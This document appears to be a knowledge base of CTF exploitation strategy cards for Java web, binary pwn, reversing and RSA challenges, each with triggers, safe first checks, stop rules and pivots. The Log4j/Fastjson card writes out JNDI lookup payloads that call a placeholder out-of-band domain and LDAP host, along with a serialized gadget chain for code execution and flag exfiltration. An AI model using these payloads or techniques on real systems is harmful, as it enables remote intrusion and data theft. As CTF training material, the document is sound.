cards.confirm: Key/config and parser behavior support a token/session primitive.
cards.falsify: No rememberMe processing or key/config gate unavailable.
cards.stop_rule: Do not run Shiro gadget payloads from dependency name alone.
cards.pivot_rule: If Shiro not exploitable, use filter chain mapping for auth bypass or route discovery.

cards.title: Fastjson autoType requires parser/config/data-shape proof
cards.trigger: Fastjson dependency, JSON.parseObject/parseArray, @type field, autoType config, or JSON parser errors.
cards.first_safe_check: Confirm Fastjson version/config and send a harmless @type/parser behavior probe before gadget payloads.
cards.oracle: Fastjson-specific error, accepted type field, parse differential, or source-proven autoType path
cards.confirm: Endpoint parses controlled type-shaped JSON under exploitable config.
cards.falsify: No Fastjson parser path, autoType disabled with no bypass clue, or body not controlled.
cards.stop_rule: Do not gadget guess without parser oracle and classpath evidence.
cards.pivot_rule: If parser not exploitable, inspect business JSON binding or auth logic.

cards.title: Thymeleaf/view expression context first
cards.trigger: Thymeleaf dependency, template fragments, view name control, template expression, or Spring view rendering with user input.
cards.first_safe_check: Identify whether input controls view name, fragment, template body, or model value; then use a harmless engine-specific marker.
cards.oracle: evaluated marker, template parse error, view resolution error, or source-proven expression sink
cards.confirm: Controlled input is evaluated by Thymeleaf/expression parser.
cards.falsify: Input is only rendered as model data or sanitized literal text.
cards.stop_rule: Do not use generic SSTI payloads before engine/context identity.
cards.pivot_rule: If expression blocked, inspect file/view path or model/data leak.

cards.title: JSP upload/write requires served reloadable path proof
cards.trigger: Java upload route, MultipartFile, filename control, JSP/Tomcat webroot, file write, archive extraction, or static resource path.
preconditions: file write/upload route and controlled filename/content
cards.first_safe_check: Upload/write benign canary and verify storage path, extension checks, served URL, and reload/execution behavior before JSP payloads.
cards.oracle: canary served/readable, path disclosure, extension bypass differential, or source-proven webroot write
cards.confirm: Controlled file lands in served/reloadable path or yields reliable file read/write primitive.
cards.falsify: Upload directory is non-executable/unserved and no traversal/write primitive exists.
cards.stop_rule: Never overwrite existing files; do not assume upload equals RCE.
cards.pivot_rule: If no JSP execution, use file read/write for config/flag/source path.

cards.title: Java XML parser XXE feature gate
cards.trigger: DocumentBuilderFactory, SAXParserFactory, XMLInputFactory, SAXReader, TransformerFactory, XML upload/import, SVG/Office XML parsing.
preconditions: controlled XML-like body/file reaches Java XML parser
cards.first_safe_check: Inspect parser features and send a benign entity/error probe to confirm DTD/entity behavior before file or SSRF payloads.
cards.oracle: entity expansion, parser error differential, callback, or source-proven insecure features
cards.confirm: External entity/DTD behavior is enabled and observable.
cards.falsify: DOCTYPE/entities disabled or parser unreachable.
cards.stop_rule: Do not spray XXE payloads without parser identity and oracle.
cards.pivot_rule: If XXE blocked, inspect SSRF/file parser chain or upload storage.

cards.title: Java URL fetcher SSRF with validator/fetcher split
cards.trigger: RestTemplate, HttpClient, WebClient, OkHttpClient, URL.openConnection, webhook/import/proxy/avatar URL feature.
preconditions: controlled URL reaches server-side Java fetcher
cards.first_safe_check: Identify URL validator and fetcher, then test one harmless scheme/host/redirect differential or same-origin oracle.
cards.oracle: fetch callback, status/body differential, parser error, redirect behavior, or source-proven fetch path
cards.confirm: Controlled URL is fetched server-side and validator can be modeled or bypassed.
cards.falsify: URL not fetched or strict allowlist blocks intended scope.
cards.stop_rule: Do not spray URL bypasses before identifying validator/fetcher and scope.
cards.pivot_rule: If fetch works, target in-scope actuator/internal route/file protocol only when challenge-intended.

cards.title: Spring Security/filter path matcher mismatch
cards.trigger: Spring Security config, Filter/Interceptor, Shiro chain, route exclusions, 401/403 boundary, path normalization clues.
preconditions: protected route or filter/security config evidence
cards.first_safe_check: Build route-auth table and test exactly one path/method normalization differential such as semicolon, trailing slash, encoded slash, or method mismatch.
cards.oracle: status/body/auth differential or source-proven matcher mismatch
cards.confirm: A path/method/session variant crosses auth boundary without losing route reachability.
cards.falsify: Matcher and handler normalize identically with no auth differential.
cards.stop_rule: Do not spray path variants before mapping matcher/filter source.
cards.pivot_rule: If bypass fails, inspect session/role checks or IDOR/workflow logic.

cards.title: Java archive extraction Zip Slip canary first
cards.trigger: ZipInputStream, ZipEntry, archive upload/extract, JarEntry, TarArchiveEntry, or filename join without normalization.
preconditions: archive member names are attacker-controlled and extracted server-side
cards.first_safe_check: Use safe archive listing/source review or a non-destructive canary path plan before attempting traversal write.
cards.oracle: canary file appears in controlled safe location, extraction error reveals path, or source proves unsafe join
cards.confirm: Archive member path escapes intended directory or writes to useful served/readable path.
cards.falsify: Canonical path check prevents traversal or extraction not reachable.
cards.stop_rule: Do not overwrite existing files; avoid blind destructive archive writes.
cards.pivot_rule: If write primitive exists, use file-write matrix to choose stable flag/source/JSP/control path.

cards.title: Java dependency risk requires version/config/reachability/data-shape gates
cards.trigger: pom.xml/build.gradle/JAR dependencies suggest Shiro/Fastjson/Jackson/MyBatis/Template/Actuator/H2/Struts/FileUpload risk.
cards.first_safe_check: Run dependency risk triage, then confirm version, config gate, reachable route/sink, and controlled data shape before CVE-shaped payloads.
cards.oracle: all gates confirmed for one dependency family or risk demoted below source-proven sinks
cards.confirm: A dependency-backed route has version/config/reachability/data-shape evidence and a first safe probe.
cards.falsify: Dependency exists but no config/reachability/data-shape evidence.
cards.stop_rule: Do not exploit from dependency name alone.
cards.pivot_rule: Choose source-proven sink or another dependency family with stronger gates.

cards.title: ret2libc crash pivot before gadget rotation
cards.trigger: ret2libc, one_gadget, ROP, system('/bin/sh'), or libc chain crashes locally/remotely after offset/control was believed correct.
preconditions: binary exploit path uses libc or ROP
cards.first_safe_check: Do one diagnostic run that verifies stack alignment, libc/ld identity, prompt synchronization, parsed leak/base, CET/IBT symptoms, clobbered registers, and one_gadget constraints before changing gadgets.
cards.oracle: Crash site/registers distinguish alignment/libc mismatch/IO sync/base error/constraint failure from wrong offset.
cards.confirm: A single diagnostic explains the crash and changes the next hypothesis.
cards.falsify: Crash happens before reaching the chain or offset/control is not proven.
cards.stop_rule: Do not rotate libc versions, one_gadget offsets, or gadgets more than 3 times without new diagnostic evidence.
cards.pivot_rule: If libc route remains unstable, pivot to ret2csu, raw syscall ROP, SROP, direct win, or leak revalidation depending on mitigations.
execution_plan: Revalidate leak/base
Run diagnostic crash once
Classify failure
Choose one pivot or corrected chain
cards.snippet: When ret2libc/ROP crashes, diagnose alignment/libc/sync/CET/constraints before rotating gadgets.

cards.title: Mitigation matrix to top-3 pwn strategy seeds
cards.trigger: Fresh ELF/native pwn target after file/checksec/readelf/strings or ctf-binary-probe evidence.
preconditions: mitigations can be measured or inferred
cards.first_safe_check: Build mitigation matrix and create at most top-3 strategy seeds: no PIE/no canary ret2win or ROP; PIE leak then ret2libc; canary leak/non-return overwrite; heap menu model; seccomp ORW/SROP; static syscall ROP.
cards.oracle: Each seed has a confirm/falsify probe tied to primitive evidence.
cards.confirm: At least one seed has a low-cost probe with expected observable behavior.
cards.falsify: Mitigation data unavailable or binary behavior unknown; pivot to triage/reverse first.
cards.stop_rule: Keep at most top-3 seeds. Do not start final exploit without primitive proof.
cards.pivot_rule: If all top seeds fail without new differential, force one orthogonal probe: source audit, protocol model, gdb crash, or leak search.
execution_plan: Read mitigation matrix
Generate top-3 seeds
Probe one variable
Observe and rerank
cards.snippet: Convert checksec/mitigations into at most top-3 strategy seeds with one confirm/falsify probe each.

cards.title: Format string offset/leak/write map before overwrite
cards.trigger: printf(user), uncontrolled format string, %p/%x/%s output, blind format oracle, stack/libc/canary/PIE leak, or candidate %n write.
cards.first_safe_check: Build read-only offset map first: positional behavior, stack drift, stable leaks by class, null truncation, and RELRO/write target before any %n write.
cards.oracle: Stable offset map and classified leak: stack, libc, PIE, canary, heap, or unknown.
cards.confirm: Read-only probes recover repeatable offset/leak values across clean runs.
cards.falsify: Input is not interpreted as a format string or output is sanitized/no oracle.
cards.stop_rule: Do not write with %n until offset, target address, write size, and RELRO/writability are known.
cards.pivot_rule: If write is blocked, use the leak to feed ret2libc/ROP/canary bypass or pivot to another primitive.
execution_plan: Find offset
Classify leaks
Check RELRO/writable targets
Only then write or chain
cards.snippet: For fmt bugs, build offset/leak/write map before overwrite; classify every leak.

cards.title: Heap menu state table before named technique
cards.trigger: Heap/menu pwn with add/delete/edit/show, UAF, double-free, off-by-one, overflow, tcache, fastbin, unsorted bin, FSOP, or custom allocator clues.
cards.first_safe_check: Build menu state table: operations, index/lifetime rules, chunk sizes, bins, libc/allocator version, show/leak path, edit/write path, and clean-run primitive proof.
cards.oracle: Repeatable heap primitive such as overlap, UAF, double-free, heap/libc leak, poisoned pointer, or controlled write.
cards.confirm: One heap primitive is repeatable across clean runs with known chunk layout.
cards.falsify: No controlled heap state change after menu/state mapping.
cards.stop_rule: Do not attempt tcache/house/FSOP before allocator version, chunk layout, and primitive evidence are known.
cards.pivot_rule: If heap state is opaque, reverse menu/state or trace allocator calls before more grooming.
query_aliases: heap menu add delete edit show
execution_plan: Map menu
Identify allocator/version
Prove primitive
Choose matching technique
cards.snippet: For heap pwn, map menu/chunks/allocator and prove primitive before tcache/house/FSOP attempts.

cards.title: Seccomp syscall model before shell route
cards.trigger: seccomp, sandbox, shell fails, execve blocked, ORW clue, syscall-only ROP, SROP, open/read/write, openat, sendfile, mmap/mprotect constraints.
preconditions: seccomp/sandbox evidence or shell route failure
cards.first_safe_check: Dump or infer allowed syscalls, then choose shell vs ORW/openat/sendfile/readv/writev/mprotect/SROP based on allowlist and file path constraints.
cards.oracle: Allowed syscall path reaches flag read/write or explains shell failure.
cards.confirm: A syscall strategy is consistent with seccomp evidence and produces a local oracle.
cards.falsify: No seccomp/sandbox evidence and shell failure is due to unrelated crash/sync/base issue.
cards.stop_rule: Do not try /bin/sh variants after seccomp evidence without syscall model.
cards.pivot_rule: If ORW syscalls unavailable, look for existing print/read-flag function, logic route, or permitted exfil syscall.
execution_plan: Inspect syscall rules
Select allowed final path
Build one syscall primitive
Verify flag read
cards.snippet: When seccomp/sandbox appears, inspect allowed syscalls before choosing shell, ORW, SROP, or mprotect.

cards.title: Remote drift revalidation after local success
cards.trigger: Exploit succeeds locally but fails remotely, hangs, wrong leak, prompt mismatch, timeout, EOF, or different crash.
preconditions: local exploit or stage partially works
cards.first_safe_check: Compare remote vs local assumptions: libc/ld, ASLR/PIE, forking, buffering, newline/null handling, timeout, prompt sync, architecture, and leak parsing before changing payload logic.
cards.oracle: One assumption mismatch explains remote failure or confirms payload logic is still valid.
cards.confirm: Adjusted environment/sync/leak parsing makes remote stage match local oracle.
cards.falsify: Remote never reaches vulnerable state or target scope/service unavailable.
cards.stop_rule: Do not brute-force remote variants without a changed hypothesis.
cards.pivot_rule: If remote libc/ld unknown, prioritize leak-based resolution or DynELF-like route; if prompt sync fails, rebuild protocol model.
execution_plan: Compare assumptions
Fix one mismatch
Retest one stage
Only then change payload
cards.snippet: When local works but remote fails, revalidate libc/ld/sync/timeout/ASLR before changing exploit technique.

cards.source: user-retro: HZNUCTF 2023 final ezjava wp comparison
cards.title: Java Log4j JNDI entry with Fastjson serialized gadget
cards.trigger: Java/Spring target says log/logger/log your uri/request URI and hints fastjson 1.2.48, fixed body, or URI-controlled logging behavior.
preconditions: User controls a value likely written to Log4j logs, especially request path/URI/header
OOB DNS/HTTP can be used for canary confirmation
Fastjson version hint or dependency appears, but direct HTTP JSON parser is not yet proven
cards.first_safe_check: Before direct @type JSON payloads, send a Log4j DNS canary such as ${jndi:dns://canary.<oob-domain>} in the logged URI/value; if it fires, send ${jndi:dns://${sys:java.version}.<oob-domain>} to learn JDK version.
cards.oracle: OOB DNS/HTTP interaction showing Log4j expression evaluation and optional java.version expansion.
cards.confirm: JNDI canary resolves; then LDAP callback or javaSerializedData deserialization triggers a command/OOB marker/flag exfil.
cards.falsify: Multiple logged locations with simple ${jndi:dns://...} produce no OOB interaction while OOB service is verified and target response remains stable.
cards.stop_rule: Do not spend payload volume on direct Fastjson HTTP @type gadgets until Log4j JNDI DNS canary is falsified or a real JSON parse sink is proven. After JDK > 8u191, do not try remote class loading; switch to LDAP javaSerializedData.
cards.pivot_rule: If Log4j JNDI fails, pivot back to direct Fastjson parser calibration, source leak, or framework route mapping. If JNDI works but javaSerializedData fails, test gadget dependency/classpath and JDK module/version constraints.
cards.source_file: user retro from HZNUCTF 2023 final ezjava WP; Java Web CTF field note
cards.snippet: For log your uri + fastjson hints, first prove Log4j JNDI with ${jndi:dns://...}; use ${sys:java.version}; for JDK > 8u191 serve LDAP javaSerializedData containing a serialized Fastjson gadget (HashMap -> BadAttributeValueExpException -> JSONArray -> TemplatesImpl), not direct HTTP JSON @type payloads.
execution_plan: Verify OOB service with a stable session/domain.
Place ${jndi:dns://canary.<domain>} in request URI/path/header likely logged.
If confirmed, send ${jndi:dns://${sys:java.version}.<domain>} and classify JDK.
If JDK <= 8u191, remote class loading may work; if JDK > 8u191, run LDAP server returning javaSerializedData.

Generate Java serialized Fastjson gadget: HashMap key TemplatesImpl, BadAttributeValueExpException.val = JSONArray containing TemplatesImpl, TemplatesImpl bytecodes execute low-impact OOB marker then flag recovery.
Trigger with ${jndi:ldap://host:port/Name}; recover flag via command/OOB or shell.
failure_modes: Treating fastjson hint as direct HTTP JSON parser before testing Log4j
Restarting interactsh and losing the same OOB domain/session
Continuing JdbcRowSetImpl/TemplatesImpl JSON path variants without OOB evidence
Trying LDAP remote class loading on JDK > 8u191 instead of javaSerializedData
Misclassifying 502/timeouts as successful gadget execution without OOB confirmation

cards.title: Heap family first questions before named techniques
cards.trigger: Menu allocator, UAF/double-free/off-by-one/overlap suspicion, malloc/free/edit/show surface, or heap crash where allocator version and chunk layout are not yet reduced.
preconditions: allocator/chunk layout is not yet modeled
no named heap route is proven yet
cards.first_safe_check: Build a chunk-state table: allocation sizes, free/edit/show transitions, freed-state reuse, leak/overlap/stale-pointer differential; classify UAF/double-free/off-by-one/overlap before trying named houses.
cards.oracle: A reduced allocator/chunk-state model with one next heap discriminator.
cards.confirm: One bug family and next primitive discriminator are supported by chunk-state evidence.
cards.falsify: Bounded menu-state tests show no reusable allocator influence or chunk-state differential.
cards.stop_rule: Do not try named heap techniques while allocator version, chunk layout, and menu state are still unknown.
cards.pivot_rule: If no heap-state differential appears, pivot to non-heap bug family or source-guided input-to-sink review.
cards.snippet: For hard heap pwn, reduce allocator version and chunk-state table before naming techniques; use one next discriminator instead of payload drift.
execution_plan: Map menu actions and chunk sizes.
Record freed-state reuse and visible leaks/overlaps.
Choose one bug-family discriminator.
Only then select a heap technique.
failure_modes: named house/tcache technique before state reduction
cards.review_recommendation: keep; hard-top-set seed derived from local SecKB hard note and failure-signature optimization

cards.title: Partial control promotion to arbitrary read/write
cards.trigger: Memory bug corrupts pointer, length, index, stale reference, adjacent field, or partial overwrite but full RIP/control-flow is not yet proven.
preconditions: controlled field or state fragment is identifiable
cards.first_safe_check: Map the exact controlled field and test one reusable target: length/index, function pointer, vtable, GOT slot, freed link, or format-string target; prove first stable read/write effect.
cards.oracle: A limited corruption becomes a stable arbitrary-read, arbitrary-write, or target-specific read/write primitive.
cards.confirm: One target promotion yields repeatable read/write semantics or state control.
cards.falsify: Limited corruption cannot reach a reusable target after bounded structure-aware tests.
cards.stop_rule: Do not design final ROP/shell while the branch has only partial control and no reusable read/write primitive.
cards.pivot_rule: If promotion fails, rerank as crash-only or source-guided bug-family discrimination.
cards.snippet: Promote limited corruption into a reusable read/write primitive before final exploit design.
execution_plan: Name the controlled field.
List reachable reusable targets.
Probe one target at a time.
Promote or kill the primitive-ladder branch.
failure_modes: partial control treated as full RCE
query_aliases: partial control to arbitrary read write
cards.review_recommendation: keep; hard-top-set seed derived from local SecKB hard note and failure-signature optimization

cards.title: Seccomp or sandbox closure favors ORW/read-flag over shell variants
cards.trigger: Confirmed pwn primitive exists but execve/shell fails, seccomp/sandbox is present, or direct flag-read/ORW looks shorter.
preconditions: memory primitive or code-reuse route is plausible
cards.first_safe_check: Identify allowed syscalls and immediate flag path assumptions; test the shortest ORW/direct-read/fd-reuse closure probe before rotating shell payloads.
cards.oracle: A syscall-compatible read-flag closure path or clear proof that the current primitive cannot close under sandbox constraints.
cards.confirm: Allowed syscall model supports ORW/read/fd-reuse and the probe reaches flag-bearing bytes or a stronger closure oracle.
cards.falsify: Allowed syscall surface and primitive cannot support shell, ORW, readback, or fd-reuse closure.
cards.stop_rule: After shell failure, try at most one shell variant before modeling syscall closure; do not rotate one_gadget endlessly.
cards.pivot_rule: If ORW/read closure is blocked, pivot to primitive strengthening or flag-location modeling, not generic shell attempts.
cards.snippet: When sandbox blocks shell, model syscall closure and direct read-flag path before changing exploit family.
execution_plan: Confirm seccomp/sandbox signal.
Map allowed syscalls or observed failures.
Try shortest ORW/readback closure.
Downgrade shell route if flat.
failure_modes: closure problem misclassified as primitive problem
cards.review_recommendation: keep; hard-top-set seed derived from local SecKB hard note and failure-signature optimization

cards.title: Checker recovery before broad decompiler reading
cards.trigger: Success/failure strings, compare-heavy logic, constants, or input validation path exist but the decisive checker is not isolated.
cards.first_safe_check: Start from success/failure xrefs or final branch, walk backward to nearest compare, then trace one controlled input to prove where input first influences acceptance.
cards.oracle: A smallest real checker path that can be emulated, inverted, or extracted into solve.py.
cards.confirm: Controlled input reaches the candidate checker and affects the final success decision.
cards.falsify: Candidate paths do not correlate with input or final success logic after bounded tracing/xrefs.
cards.stop_rule: After two decompiler-reading passes without checker isolation, pivot to xrefs, single-input trace, or dynamic boundary check.
cards.pivot_rule: If no checker is found, pivot to packer/VM/anti-analysis reduction or artifact-specific entrypoint mapping.
cards.snippet: Recover the smallest real checker path before broad decompilation or solver work.
execution_plan: Find success/failure xrefs.
Walk backward to compare boundary.
Trace one controlled input.
Extract a minimal executable checker.
cards.review_recommendation: keep; hard-top-set seed derived from local SecKB hard note and failure-signature optimization

cards.title: VM or bytecode reduction before full deobfuscation
cards.trigger: Dispatch loop, opcode table, handler set, bytecode source, or interpreter-like state appears and full semantics are not reduced.
cards.first_safe_check: Identify dispatcher, opcode source, instruction pointer progression, core state container, and one handler semantics before full devirtualization.
cards.oracle: A reduced VM model with one verified handler and state transition that can guide solver or trace work.
cards.confirm: Opcode fetch, dispatch, and one handler effect are verified against static or dynamic evidence.
cards.falsify: No persistent dispatch/state pattern survives bounded static and dynamic checks.
cards.stop_rule: Do not attempt full deobfuscation before dispatcher, opcode source, and one handler are modeled.
cards.pivot_rule: If VM signal is false, pivot to table transform, checker recovery, or anti-analysis barrier localization.
cards.snippet: For VM-like rev, reduce dispatcher/opcode/state/one handler first; avoid full devirtualization drift.
execution_plan: Locate dispatch loop.
Identify opcode source and state.
Model one handler.
Choose trace, lifter, or solver next.
cards.review_recommendation: keep; hard-top-set seed derived from local SecKB hard note and failure-signature optimization

cards.title: Symbolic vs manual split after checker model
cards.trigger: Checker exists and contains constraints/transforms, but it is unclear whether to invert manually, emulate, or escalate to Z3/symbolic tooling.
cards.first_safe_check: Partition the checker into reversible/manual pieces and true bit-vector/branch constraints; verify exact widths/order before feeding only residual constraints to a solver.
cards.oracle: A justified mixed-mode solve plan with smaller state and verified semantics.
cards.confirm: Manual pieces are reduced and solver residual predicts checker behavior on a sample.
cards.falsify: No stable checker/constraint model exists, so method choice is premature.
cards.stop_rule: Do not escalate to symbolic solving while checker semantics, widths, loop bounds, or endian assumptions are unverified.
cards.pivot_rule: If symbolic route is premature, pivot to checker recovery, table transform, or semantic verification.
cards.snippet: Split rev solving into manual reduction plus residual symbolic constraints after the checker is verified.
execution_plan: Verify checker semantics.
Partition reversible vs constraint-heavy parts.
Reduce state manually.
Solve only residual constraints.
cards.review_recommendation: keep; hard-top-set seed derived from local SecKB hard note and failure-signature optimization

cards.title: RSA family discriminator before custom algebra
cards.trigger: RSA parameters exist but exact weakness family is ambiguous; small-e/shared-prime/common-modulus/close-prime/CRT/padding/oracle branches are all plausible.
preconditions: RSA-like parameters are normalized or available
cards.first_safe_check: Build a family matrix of available parameters and prerequisites; run cheapest eliminators first: gcd/shared primes, common modulus, small exponent, close primes, CRT leaks, padding/oracle gate.
cards.oracle: A justified RSA family route or explicit negative result for common families.
cards.confirm: One family prerequisite set is satisfied and yields a concrete next recovery test.
cards.falsify: Normalized parameters match no known weak family and no oracle/padding clue exists.
